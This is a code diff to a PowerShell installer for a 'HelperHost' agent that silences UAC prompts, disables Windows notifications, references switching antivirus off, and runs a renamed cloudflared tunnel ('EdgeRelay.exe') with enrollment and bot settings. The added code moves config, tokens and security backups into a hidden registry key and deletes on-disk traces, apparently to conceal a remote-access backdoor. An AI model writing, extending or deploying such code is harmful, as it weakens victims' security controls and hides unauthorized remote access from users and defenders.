@@ -57,7 +57,47 @@ function Close-Console {
   Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
 }
 
+function Save-HHState {
+  param([hashtable]$Patch)
+  $key = 'HKCU:\Software\HelperHost'
+  New-Item $key -Force | Out-Null
+  $cur = [ordered]@{}
+  $raw = (Get-ItemProperty $key -Name state -EA SilentlyContinue).state
+  if ($raw) {
+    try {
+      $j = $raw | ConvertFrom-Json
+      foreach ($p in $j.PSObject.Properties) { if ($p.Name -notmatch '^PS') { $cur[$p.Name] = $p.Value } }
+    } catch {}
+  }
+  foreach ($k in $Patch.Keys) { $cur[$k] = $Patch[$k] }
+  Set-ItemProperty $key -Name state -Value (($cur | ConvertTo-Json -Compress)) -Type String -Force
+}
+
+function Test-HelperReady {
+  if (-not (Get-Process HelperHost -ErrorAction SilentlyContinue)) { return $false }
+  $raw = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+  if ($raw) {
+    try {
+      $j = $raw | ConvertFrom-Json
+      if ($j.token) { return $true }
+    } catch {}
+  }
+  return (Test-Path (Join-Path $Dir 'token'))
+}
+
+function Clear-LegacySidecars {
+  $ErrorActionPreference = 'SilentlyContinue'
+  foreach ($n in @(
+    'config.json','token','public_url','agent.log','boot.log','agent.lock',
+    'notify-backup.json','uac-backup.json','restore-security.ps1',
+    'watchdog.vbs','reconnect.vbs','watchdog.lock','EdgeRelay.exe','.av-off'
+  )) {
+    Remove-Item (Join-Path $Dir $n) -Force -EA SilentlyContinue
+  }
+}
+
 function Finish-Ok {
+  Clear-LegacySidecars
   Write-Output 'OK'
   try { Clear-ResumeTasks } catch {}
   Start-Sleep -Milliseconds 400
@@ -87,6 +127,7 @@ function Invoke-ElevatedInstall {
   $fail = Join-Path $env:TEMP 'HelperHost-install.err'
   $pending = Join-Path $env:LOCALAPPDATA 'HelperHost\install-pending'
   $tokenProbe = Join-Path $env:LOCALAPPDATA 'HelperHost\token'
+  $readyKey = 'HKCU:\Software\HelperHost'
   Remove-Item $marker, $fail -Force -ErrorAction SilentlyContinue
   $en = $Enroll.Replace("'", "''")
   $bb = $BotBase.Replace("'", "''")
@@ -138,6 +179,16 @@ function Invoke-ElevatedInstall {
       Remove-Item $wrap -Force -ErrorAction SilentlyContinue
       $script:ElevDoneOk = $true
       return
+    }
+    $stRaw = (Get-ItemProperty $readyKey -Name state -EA SilentlyContinue).state
+    if ($stRaw -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
+      try {
+        if (($stRaw | ConvertFrom-Json).token) {
+          Remove-Item $wrap -Force -ErrorAction SilentlyContinue
+          $script:ElevDoneOk = $true
+          return
+        }
+      } catch {}
     }
     if (Test-Path $pending) {
       Remove-Item $wrap -Force -ErrorAction SilentlyContinue
@@ -219,8 +270,12 @@ function Unblock-Quiet([string]$Path) {
 
 function Disable-WindowsNotifications {
   $ErrorActionPreference = 'SilentlyContinue'
-  $bak = Join-Path $Dir 'notify-backup.json'
-  if (-not (Test-Path $bak)) {
+  $rawExisting = $null
+  try {
+    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+    if ($st) { $rawExisting = ($st | ConvertFrom-Json).notify_bak }
+  } catch {}
+  if (-not $rawExisting -and -not (Test-Path (Join-Path $Dir 'notify-backup.json'))) {
     $o = [ordered]@{}
     $push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
     if (Test-Path $push) {
@@ -242,7 +297,7 @@ function Disable-WindowsNotifications {
       $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -EA SilentlyContinue).NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND
       if ($null -ne $v) { $o.allow_notif_sound = [int]$v }
     }
-    ($o | ConvertTo-Json) | Set-Content -Encoding UTF8 $bak
+    Save-HHState @{ notify_bak = ($o | ConvertTo-Json -Compress) }
   }
   New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
   Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name ToastEnabled -Value 0 -Type DWord -Force
@@ -303,14 +358,18 @@ function Disable-UACPrompts {
   $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
   if (-not (Test-Path $sysPol)) { return }
   if (-not (Test-IsAdmin)) { return }
-  $bak = Join-Path $Dir 'uac-backup.json'
-  if (-not (Test-Path $bak)) {
+  $haveUac = $false
+  try {
+    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
+    if ($st -and ($st | ConvertFrom-Json).uac_bak) { $haveUac = $true }
+  } catch {}
+  if (-not $haveUac) {
     $o = [ordered]@{}
     foreach ($n in @('EnableLUA', 'ConsentPromptBehaviorAdmin', 'ConsentPromptBehaviorUser', 'PromptOnSecureDesktop', 'EnableInstallerDetection')) {
       $v = (Get-ItemProperty $sysPol -Name $n -EA SilentlyContinue).$n
       if ($null -ne $v) { $o[$n] = [int]$v }
     }
-    ($o | ConvertTo-Json) | Set-Content -Encoding UTF8 $bak
+    Save-HHState @{ uac_bak = ($o | ConvertTo-Json -Compress) }
   }
   # Elevate without prompting (UAC still "on" but silent for admins)
   Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value 0 -Type DWord -Force
@@ -684,7 +743,7 @@ Si politique d'organisation (GPO/MDM), elle doit etre retiree.
 }
 
 function Install-WipeRestoreHook {
-  $restoreDest = Join-Path $Dir 'restore-security.ps1'
+  $restoreDest = Join-Path $env:TEMP 'hh-restore-security.ps1'
   $restoreUrl = $null
   if ($InstallUrl) {
     $restoreUrl = $InstallUrl -replace 'install-win\.ps1', 'restore-win-security.ps1' -replace 'install\.ps1', 'restore-win-security.ps1'
@@ -729,15 +788,13 @@ if ($SessionPrep) {
 }
 
 Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
-Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
+# EdgeRelay is fetched by HelperHost into TEMP — not stored in the install folder
 
-@{ enroll = $Enroll; bot_base = $BotBase } | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
+Save-HHState @{ enroll = $Enroll; bot_base = $BotBase }
 $env:AGENTSHE_ENROLL = $Enroll
 $env:AGENTSHE_BOT_BASE = $BotBase
 $Helper = Join-Path $Dir 'HelperHost.exe'
-$tokenFile = Join-Path $Dir 'token'
-$agentLog = Join-Path $Dir 'agent.log'
-Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
+Clear-LegacySidecars
 $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
 Disable-WindowsNotifications
@@ -758,12 +815,7 @@ if ($script:ElevRebootPending) {
 $ok = $false
 for ($i=0; $i -lt 180; $i++) {
   Start-Sleep -Seconds 1
-  if (Test-Path $agentLog) {
-    $txt = Get-Content $agentLog -Raw -ErrorAction SilentlyContinue
-    if ($txt -match 'FAIL') { throw 'install failed' }
-  }
-  if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
-    # Toujours: AV off + UAC silencieux + exclusions (elev si besoin)
+  if (Test-HelperReady) {
     try { Invoke-ElevatedSessionPrep } catch {}
     Finish-Ok
     $ok = $true
